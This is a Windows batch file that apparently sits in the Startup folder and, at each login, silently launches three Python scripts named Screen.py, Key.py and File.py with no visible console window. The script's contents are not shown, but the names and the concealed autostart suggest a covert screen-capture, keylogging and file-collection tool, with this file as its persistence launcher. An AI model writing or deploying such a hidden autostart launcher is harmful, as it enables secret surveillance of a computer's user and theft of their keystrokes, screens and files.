@echo off
setlocal

:: Ensure we are running from the Startup folder
cd /d "%~dp0"



:: Check if pythonw exists
where pythonw >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
)

:: Run scripts silently (no console window)
start "" pythonw "%~dp0Screen.py"
timeout /t 2 >nul

start "" pythonw "%~dp0Key.py"
timeout /t 2 >nul

start "" pythonw "%~dp0File.py"


exit